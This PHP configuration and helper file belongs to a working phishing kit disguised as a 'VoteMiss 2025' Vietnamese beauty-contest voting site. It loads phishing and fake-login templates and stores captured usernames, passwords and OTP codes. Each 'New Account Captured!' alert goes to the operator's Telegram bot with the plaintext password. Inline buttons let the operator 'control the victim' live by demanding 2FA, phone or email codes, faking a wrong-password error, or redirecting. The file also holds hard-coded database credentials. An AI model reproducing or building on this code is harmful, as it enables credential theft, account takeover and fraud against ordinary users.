<?php
// config.php - Database configuration

// Database configuration
define('DB_HOST', 'localhost');
define('DB_NAME', 'read1');
define('DB_USER', 'read1');
define('DB_PASS', 'WbkBdxkiNrennEeC');
define('DB_CHARSET', 'utf8mb4');

// PDO connection options
$pdo_options = [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES => false,
    PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES " . DB_CHARSET
];

// Create PDO connection
try {
    $dsn = "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME . ";charset=" . DB_CHARSET;
    $pdo = new PDO($dsn, DB_USER, DB_PASS, $pdo_options);
} catch (PDOException $e) {
    die("Database connection failed: " . $e->getMessage());
}

// Function to get website by slug
function getWebsiteBySlug($pdo, $slug) {
    $stmt = $pdo->prepare("
        SELECT 
            w.*,
            u.username as owner_username,
            u.email as owner_email,
            d.domain_name,
            t1.name as phishing_template_name,
            t2.name as login_template_name
        FROM websites w
        LEFT JOIN users u ON w.user_id = u.id
        LEFT JOIN domains d ON w.domain = d.domain_name
        LEFT JOIN templates t1 ON w.phishing_template_id = t1.id
        LEFT JOIN templates t2 ON w.login_template_id = t2.id
        WHERE w.slug = ?
    ");
    
    $stmt->execute([$slug]);
    return $stmt->fetch();
}

// Function to get website statistics
function getWebsiteStats($pdo, $website_id) {
    $stats = [];
    
    // Get account count
    $stmt = $pdo->prepare("SELECT COUNT(*) as total_accounts FROM account_list WHERE website = ?");
    $stmt->execute([$website_id]);
    $stats['total_accounts'] = $stmt->fetch()['total_accounts'];
    
    // Get accounts by status
    $stmt = $pdo->prepare("
        SELECT status, COUNT(*) as count 
        FROM account_list 
        WHERE website = ? 
        GROUP BY status
    ");
    $stmt->execute([$website_id]);
    $stats['accounts_by_status'] = $stmt->fetchAll();
    
    // Get recent accounts (last 10)
    $stmt = $pdo->prepare("
        SELECT username, password, status, created_at 
        FROM account_list 
        WHERE website = ? 
        ORDER BY created_at DESC 
        LIMIT 10
    ");
    $stmt->execute([$website_id]);
    $stats['recent_accounts'] = $stmt->fetchAll();
    
    return $stats;
}

// Function to get all websites
function getAllWebsites($pdo) {
    $stmt = $pdo->prepare("
        SELECT 
            w.id,
            w.title,
            w.slug,
            w.description,
            w.view_count,
            w.created_at,
            u.username as owner_username
        FROM websites w
        LEFT JOIN users u ON w.user_id = u.id
        ORDER BY w.created_at DESC
    ");
    
    $stmt->execute();
    return $stmt->fetchAll();
}

// Function to get phishing template
function getPhishingTemplate($pdo, $template_id) {
    $stmt = $pdo->prepare("
        SELECT 
            id,
            name,
            description,
            type,
            content_html,
            content_css,
            content_js,
            is_active
        FROM templates 
        WHERE id = ? AND type = 'phishing' AND is_active = 1
    ");
    
    $stmt->execute([$template_id]);
    return $stmt->fetch();
}

// Function to get login template
function getLoginTemplate($pdo, $template_id) {
    $stmt = $pdo->prepare("
        SELECT 
            id,
            name,
            description,
            type,
            content_html,
            content_css,
            content_js,
            is_active
        FROM templates 
        WHERE id = ? AND type = 'login' AND is_active = 1
    ");
    
    $stmt->execute([$template_id]);
    return $stmt->fetch();
}

// Function to increment view count
function incrementViewCount($pdo, $website_id) {
    $stmt = $pdo->prepare("UPDATE websites SET view_count = view_count + 1 WHERE id = ?");
    $stmt->execute([$website_id]);
}

// Error handling function
function handleError($message, $code = 500) {
    http_response_code($code);
    echo json_encode([
        'error' => true,
        'message' => $message,
        'code' => $code
    ]);
    exit();
}

function getClientIp(?array $trustedProxies = null): ?string {
    $remoteAddr = $_SERVER['REMOTE_ADDR'] ?? null;

    $allowForwarded = true;
    if (is_array($trustedProxies)) {
        $allowForwarded = in_array($remoteAddr, $trustedProxies, true);
    }

    if ($allowForwarded) {
        // Thứ tự kiểm tra các header
        $headers = [
            'HTTP_CF_CONNECTING_IP', // Cloudflare
            'HTTP_X_REAL_IP',
            'HTTP_X_FORWARDED_FOR',  // có thể là danh sách: client, proxy1, proxy2
            'HTTP_CLIENT_IP'
        ];

        foreach ($headers as $h) {
            if (empty($_SERVER[$h])) continue;
            $val = trim($_SERVER[$h]);
            if ($val === '') continue;

            if ($h === 'HTTP_X_FORWARDED_FOR') {
                $parts = array_map('trim', explode(',', $val));
                foreach ($parts as $part) {
                    if (isValidPublicIp($part)) return $part;
                }
                foreach ($parts as $part) {
                    if (isValidIp($part)) return $part;
                }
            } else {
                if (isValidIp($val)) return $val;
            }
        }
    }

    if ($remoteAddr && isValidIp($remoteAddr)) return $remoteAddr;
    return null;
}

function isValidIp(string $ip): bool {
    return (bool) filter_var($ip, FILTER_VALIDATE_IP);
}

function isValidPublicIp(string $ip): bool {
    return (bool) filter_var(
        $ip,
        FILTER_VALIDATE_IP,
        FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
    );
}

// Function to generate complete SEO meta tags
function generateSEOMetaTags($website, $current_url) {
    // Basic information
    $site_name = "VoteMiss 2025";
    $site_description = "Cuộc thi sắc đẹp VoteMiss 2025 - Bình chọn cho người đẹp yêu thích của bạn";
    
    // Website specific information
    $title = !empty($website['title']) ? htmlspecialchars($website['title']) : $site_name;
    $description = !empty($website['description']) ? htmlspecialchars($website['description']) : $site_description;
    
    // Image handling - use website thumbnail or default
    $image = '';
    if (!empty($website['thumbnail'])) {
        // If thumbnail is relative path, make it absolute
        if (strpos($website['thumbnail'], 'http') !== 0) {
            $image = 'https://scanvia.org/'.'/' . ltrim($website['thumbnail'], '/');
        } else {
            $image = 'https://scanvia.org/'.$website['thumbnail'];
        }
    } else {
        // Default image
        $image = 'https://' . $_SERVER['HTTP_HOST'] . '/app.png';
    }
    
    // Canonical URL
    $canonical_url = $current_url;
    
    // Generate meta tags
    $meta_tags = '
    <!-- Basic SEO Meta Tags -->
    <title>' . $title . '</title>
    <meta name="description" content="' . $description . '">
    <meta name="keywords" content="vote miss, cuộc thi sắc đẹp, bình chọn, người đẹp, ' . $website['title'] . '">
    <meta name="author" content="' . $site_name . '">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta charset="UTF-8">
    <link rel="canonical" href="' . $canonical_url . '">
    
    <!-- Open Graph Meta Tags -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="' . $title . '">
    <meta property="og:description" content="' . $description . '">
    <meta property="og:image" content="' . $image . '">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:url" content="' . $canonical_url . '">
    <meta property="og:site_name" content="' . $site_name . '">
    <meta property="og:locale" content="vi_VN">
    
    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="' . $title . '">
    <meta name="twitter:description" content="' . $description . '">
    <meta name="twitter:image" content="' . $image . '">
    <meta name="twitter:site" content="@votemiss2025">
    <meta name="twitter:creator" content="@votemiss2025">
    
    <!-- Additional SEO Meta Tags -->
    <meta name="robots" content="index, follow">
    <meta name="googlebot" content="index, follow">
    <meta name="theme-color" content="#ff6b6b">
    <meta name="msapplication-TileColor" content="#ff6b6b">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="apple-mobile-web-app-title" content="' . $title . '">
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="/app.png">
    <link rel="apple-touch-icon" href="/app.png">
    
    <!-- Schema.org JSON-LD -->
    <script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "WebPage",
        "name": "' . addslashes($title) . '",
        "description": "' . addslashes($description) . '",
        "url": "' . $canonical_url . '",
        "image": "' . $image . '",
        "publisher": {
            "@type": "Organization",
            "name": "' . $site_name . '",
            "logo": {
                "@type": "ImageObject",
                "url": "https://' . $_SERVER['HTTP_HOST'] . '/app.png"
            }
        }
    }
    </script>';
    
    return $meta_tags;
}

// Function to get Telegram bots for a user
function getTelegramBots($pdo, $user_id) {
    try {
        $stmt = $pdo->prepare("
            SELECT * FROM telegram_bots 
            WHERE user_id = ? AND is_enabled = 1 AND is_verified = 1
        ");
        $stmt->execute([$user_id]);
        return $stmt->fetchAll();
    } catch (Exception $e) {
        error_log("Database error getting telegram bots: " . $e->getMessage());
        return [];
    }
}

// Function to delete Telegram message
function deleteTelegramMessage($bot_token, $chat_id, $message_id) {
    try {
        $url = "https://api.telegram.org/bot{$bot_token}/deleteMessage";
        
        $data = [
            'chat_id' => $chat_id,
            'message_id' => $message_id
        ];
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return $http_code === 200;
        
    } catch (Exception $e) {
        return false;
    }
}

// Function to send Telegram notification
function sendTelegramNotification($bot_token, $chat_id, $message, $reply_markup = null) {
    try {
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true
        ];
        
        if ($reply_markup) {
            $data['reply_markup'] = json_encode($reply_markup);
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code === 200) {
            return ['success' => true, 'response' => $response];
        } else {
            return ['success' => false, 'error' => "HTTP $http_code: $response"];
        }
        
    } catch (Exception $e) {
        return ['success' => false, 'error' => $e->getMessage()];
    }
}

// Function to get template fields for a website
function getTemplateFields($pdo, $website_id) {
    try {
        $stmt = $pdo->prepare("
            SELECT tf.* FROM template_fields tf
            INNER JOIN websites w ON (
                (w.phishing_template_id = tf.template_id) OR 
                (w.login_template_id = tf.template_id)
            )
            WHERE w.id = ?
            ORDER BY tf.field_order ASC
        ");
        $stmt->execute([$website_id]);
        return $stmt->fetchAll();
    } catch (Exception $e) {
        error_log("Error getting template fields: " . $e->getMessage());
        return [];
    }
}

// Function to create Telegram inline keyboard based on template fields
function createAccountControlKeyboard($account_id, $website_id, $pdo) {
    try {
        // Get template fields for this website
        $fields = getTemplateFields($pdo, $website_id);
        
        if (empty($fields)) {
            // Fallback to basic controls if no fields found
            return [
                'inline_keyboard' => [
                    [
                        ['text' => '📝 Fill Form', 'callback_data' => "fill_form:{$account_id}:{$website_id}"],
                        ['text' => '✅ Submit Form', 'callback_data' => "submit_form:{$account_id}:{$website_id}"]
                    ],
                    [
                        ['text' => '🔄 Redirect', 'callback_data' => "redirect:{$account_id}:{$website_id}"]
                    ]
                ]
            ];
        }
        
        $keyboard = [];
        $row = [];
        $field_icons = [
            'otp2fa' => '🔐',
            'otp_2fa' => '🔐',
            'device' => '📱',
            'search_phone' => '🔍📞',
            'phone_search' => '🔍📞',
            'search_mail' => '🔍📧',
            'email_search' => '🔍📧',
            'otp_phone' => '📱💬',
            'phone_otp' => '📱💬',
            'otp_mail' => '📧💬',
            'email_otp' => '📧💬',
            'username' => '👤',
            'password' => '🔑',
            'email' => '📧',
            'phone' => '📞',
            'code' => '🔢',
            'token' => '🎫',
            'verification' => '✅',
            'wrongpass' => '❌',
            'wrong_pass' => '❌',
            'done' => '✅'
        ];
        
        // Create buttons for each field (2 per row)
        foreach ($fields as $field) {
            $field_name = strtolower($field['field_name']);
            $field_label = $field['field_label'] ?: ucfirst(str_replace('_', ' ', $field_name));
            
            // Get appropriate icon
            $icon = $field_icons[$field_name] ?? '📝';
            
            $button = [
                'text' => "{$icon} {$field_label}", // Display field_label (Wrong Pass)
                'callback_data' => "field:{$field_label}:{$account_id}:{$website_id}" // Send field_label for switchTemplate
            ];
            
            $row[] = $button;
            
            // Add row when we have 2 buttons or it's the last field
            if (count($row) === 2 || $field === end($fields)) {
                $keyboard[] = $row;
                $row = [];
            }
        }
        
        // Add general control buttons
        $keyboard[] = [
            ['text' => '✅ Submit All', 'callback_data' => "submit_form:{$account_id}:{$website_id}"],
            ['text' => '🔄 Redirect', 'callback_data' => "redirect:{$account_id}:{$website_id}"]
        ];
        
        return ['inline_keyboard' => $keyboard];
        
    } catch (Exception $e) {
        error_log("Error creating keyboard: " . $e->getMessage());
        // Return basic keyboard on error
        return [
            'inline_keyboard' => [
                [
                    ['text' => '📝 Fill Form', 'callback_data' => "fill_form:{$account_id}:{$website_id}"],
                    ['text' => '✅ Submit Form', 'callback_data' => "submit_form:{$account_id}:{$website_id}"]
                ]
            ]
        ];
    }
}

// Function to format account data for Telegram message
function formatAccountForTelegram($accountData, $website_title, $account_id = null) {
    $username = htmlspecialchars($accountData['username'] ?? 'N/A');
    $password = htmlspecialchars($accountData['password'] ?? 'N/A'); // Show real password
    $ip = $accountData['ip_address'] ?? 'Unknown';
    $status = $accountData['status'] ?? 'success';
    $created_at = $accountData['created_at'] ?? date('Y-m-d H:i:s');
    $display_id = $account_id ?? ($accountData['id'] ?? 'N/A');
    
    // Parse content to get OTP/additional data
    $content_display = '';
    if (isset($accountData['content']) && !empty($accountData['content'])) {
        $content = $accountData['content'];
        if (is_string($content)) {
            $decoded = json_decode($content, true);
            if ($decoded && isset($decoded['Data']) && $decoded['Data'] !== 'Nothing') {
                $content_display = "\n🔢 <b>OTP/Content:</b> <code>" . htmlspecialchars($decoded['Data']) . "</code>";
            }
        }
    }
    
    $statusEmoji = [
        'success' => '✅',
        'pending' => '⏳',
        'wrong-pass' => '❌',
        'otp-mail' => '📧',
        'otp-phone' => '📱',
        'otp-2fa' => '🔐',
        'order-device' => '📟',
        'require-pass' => '🔑',
        'require-mail' => '📬'
    ];
    
    $emoji = $statusEmoji[$status] ?? '❓';
    
    return "🚨 <b>New Account Captured!</b>\n\n" .
           "🆔 <b>Account ID:</b> <code>{$display_id}</code>\n" .
           "👤 <b>Username:</b> <code>{$username}</code>\n" .
           "🔐 <b>Password:</b> <code>{$password}</code>" .
           $content_display . "\n" .
           "🌐 <b>Website:</b> {$website_title}\n" .
           "📍 <b>IP Address:</b> <code>{$ip}</code>\n" .
           "{$emoji} <b>Status:</b> {$status}\n" .
           "⏰ <b>Time:</b> {$created_at}\n\n" .
           "<i>Click buttons below to control the victim:</i>";
}

// Function to delete old Telegram messages for same session
function deleteOldTelegramMessages($pdo, $bot_id, $chat_id, $ssid, $bot_token) {
    try {
        // Get old messages for this session
        $stmt = $pdo->prepare("
            SELECT message_id FROM telegram_messages 
            WHERE bot_id = ? AND chat_id = ? AND ssid = ?
            ORDER BY sent_at DESC
        ");
        $stmt->execute([$bot_id, $chat_id, $ssid]);
        $old_messages = $stmt->fetchAll();
        
        // Delete old messages from Telegram
        foreach ($old_messages as $msg) {
            deleteTelegramMessage($bot_token, $chat_id, $msg['message_id']);
        }
        
        // Delete records from database
        if (!empty($old_messages)) {
            $stmt = $pdo->prepare("
                DELETE FROM telegram_messages 
                WHERE bot_id = ? AND chat_id = ? AND ssid = ?
            ");
            $stmt->execute([$bot_id, $chat_id, $ssid]);
        }
        
        return count($old_messages);
        
    } catch (Exception $e) {
        error_log("Error deleting old telegram messages: " . $e->getMessage());
        return 0;
    }
}

// Function to save Telegram message ID
function saveTelegramMessageId($pdo, $bot_id, $chat_id, $message_id, $ssid, $website_id) {
    try {
        $stmt = $pdo->prepare("
            INSERT INTO telegram_messages (bot_id, chat_id, message_id, ssid, website_id, sent_at) 
            VALUES (?, ?, ?, ?, ?, NOW())
        ");
        $stmt->execute([$bot_id, $chat_id, $message_id, $ssid, $website_id]);
        return true;
    } catch (Exception $e) {
        error_log("Error saving telegram message ID: " . $e->getMessage());
        return false;
    }
}

// Function to update Telegram bot stats
function updateTelegramBotStats($pdo, $bot_id, $success = true, $error = null) {
    try {
        if ($success) {
            $stmt = $pdo->prepare("
                UPDATE telegram_bots 
                SET messages_sent = messages_sent + 1, 
                    last_message_at = NOW(),
                    last_error = NULL,
                    last_error_at = NULL
                WHERE id = ?
            ");
            $stmt->execute([$bot_id]);
        } else {
            $stmt = $pdo->prepare("
                UPDATE telegram_bots 
                SET last_error = ?, 
                    last_error_at = NOW()
                WHERE id = ?
            ");
            $stmt->execute([$error, $bot_id]);
        }
    } catch (Exception $e) {
        error_log("Error updating telegram bot stats: " . $e->getMessage());
    }
}

/* ==== Ví dụ dùng ==== */
// 1) Nếu không biết server có proxy: (không cho phép đọc X-Forwarded-* nếu bạn không tin proxy)
$ip = getClientIp();
?>
